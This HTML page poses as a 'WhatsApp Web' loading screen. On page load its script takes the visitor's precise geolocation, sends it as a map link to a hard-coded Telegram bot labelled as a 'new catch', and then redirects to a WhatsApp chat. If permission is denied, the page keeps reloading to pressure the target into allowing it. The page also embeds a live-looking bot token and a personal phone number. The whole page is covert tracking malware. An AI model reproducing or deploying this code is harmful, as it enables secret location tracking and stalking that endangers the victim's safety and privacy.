<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>WhatsApp Web</title>
    <style>
        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loading-text { color: #075e54; font-weight: bold; }
    </style>
</head>
<body>
    <div class="loading-text">جاري فتح محادثة الواتساب...</div>

<script>
    const botToken = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chatId = '7214473798';
    const targetPhone = '963997715905'; // الرقم الذي زودتني به مع رمز الدولة

    function startCapture() {
        const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const acc = p.coords.accuracy;

                // رابط الخرائط الاحترافي الذي يفتح التطبيق مباشرة
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const report = `🎯 **صيد جديد من واتساب!**\n\n📍 الموقع:\n${mapLink}\n\n📏 الدقة: ${acc.toFixed(1)} متر`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
                .then(() => {
                    // تحويل الهدف لمحادثة الواتساب فوراً
                    window.location.href = `https://wa.me/${targetPhone}`;
                });

            }, function(e) {
                // إذا رفضت، نعيد المحاولة لإجبارها على "سماح"
                location.reload();
            }, options);
        }
    }

    window.onload = startCapture;
</script>
</body>
</html>
